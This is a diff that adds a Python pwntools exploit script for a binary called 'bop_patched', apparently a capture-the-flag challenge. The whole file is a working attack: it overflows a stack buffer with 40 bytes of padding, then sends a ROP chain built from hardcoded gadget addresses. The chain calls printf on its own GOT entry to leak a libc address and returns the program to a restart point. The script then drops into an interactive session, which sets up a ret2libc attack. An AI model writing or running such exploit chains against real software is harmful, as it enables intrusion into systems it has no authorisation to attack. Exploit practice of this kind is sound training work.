@@ -1,0 +1,55 @@
+#!/usr/bin/python2
+
+from pwn import *
+
+exe = ELF("bop_patched")
+
+context.binary = exe
+sla = lambda r,a,b : r.sendlineafter(a,b)
+sl = lambda r,a : r.sendline(a)
+ru = lambda r,a : r.recvuntil(a)
+
+rdi = 0x00000000004013d3#: pop rdi; ret;
+rsi = 0x00000000004013d1#: pop rsi; pop r15; ret;
+entry = 0x00401130
+restart = 0x00401142
+printf_got = 0x00404038
+printf_plt = 0x004010f4
+
+def conn():
+    if args.LOCAL:
+        r = process([exe.path])
+        if args.DEBUG:
+            gdb.attach(r)
+    else:
+        r = remote("localhost", 12345)
+
+    return r
+
+def trigger(r, chain):
+    payload = "A"*40
+    payload += chain
+    sla(r, "? ", payload)
+
+def main():
+    r = conn()
+
+    chain = p64(rdi)
+    chain += p64(printf_got)
+    chain += p64(rsi)
+    chain += p64(0)
+    chain += p64(0)
+    chain += p64(printf_plt)
+    chain += p64(restart)
+    #gdb.attach(r)
+    trigger(r, chain)
+
+    printf_libc = u64(r.recv(6) + "\x00\x00")
+    log.info("PRINTF_LIBC: {}".format(hex(printf_libc)))
+
+    r.interactive()
+
+
+
+if __name__ == "__main__":
+    main()
